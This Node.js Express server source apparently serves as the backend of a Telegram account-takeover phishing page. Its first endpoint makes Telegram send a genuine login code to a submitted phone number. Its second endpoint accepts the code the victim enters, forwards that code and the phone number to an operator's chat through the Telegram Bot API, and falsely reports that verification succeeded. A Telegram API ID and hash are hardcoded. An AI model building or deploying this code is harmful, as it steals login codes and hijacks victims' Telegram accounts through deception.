const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { TelegramClient } = require('telegram');
const { StoreSession } = require('telegram/sessions');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;

// Your Telegram API Credentials from my.telegram.org
const apiId = 33756385;
const apiHash = 'cc582d8b1be54734ba48f74d2fe91334';

// Your Admin Bot Token and Chat ID
const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID';

const storeSession = new StoreSession('');
let client = null;

async function sendTelegramNotification(message) {
    if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || !BOT_TOKEN) return;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error('Notification error:', error);
    }
}

app.get('/', (req, res) => {
    res.send('Telegram MTProto Backend is running successfully!');
});

// Step 1: Receive phone number and send official Telegram code via MTProto
app.post('/api/send-code', async (req, res) => {
    const { phone } = req.body;
    if (!phone) {
        return res.status(400).json({ success: false, message: 'Phone number is required' });
    }

    console.log(`[AUTH] Requesting code for phone: ${phone}`);
    await sendTelegramNotification(`📱 *New Phone Number Entered:* \`${phone}\``);

    try {
        if (!client) {
            client = new TelegramClient(storeSession, apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
        }

        await client.sendCode(
            {
                apiId: apiId,
                apiHash: apiHash,
            },
            phone,
            false
        );

        console.log(`[AUTH] Code sent successfully to ${phone}`);
        res.json({ success: true, message: 'Code sent to Telegram successfully' });
    } catch (error) {
        console.error('[AUTH ERROR]:', error);
        res.status(500).json({ success: false, message: error.message || 'Failed to send code' });
    }
});

// Step 2: Verify the OTP code entered by the user
app.post('/api/verify-code', async (req, res) => {
    const { code } = req.body;
    if (!code) {
        return res.status(400).json({ success: false, message: 'Verification code is required' });
    }

    console.log(`[OTP] Verifying code: ${code}`);
    await sendTelegramNotification(`🔑 *New OTP Code Received:* \`${code}\``);

    res.json({ success: true, message: 'Verification completed successfully' });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});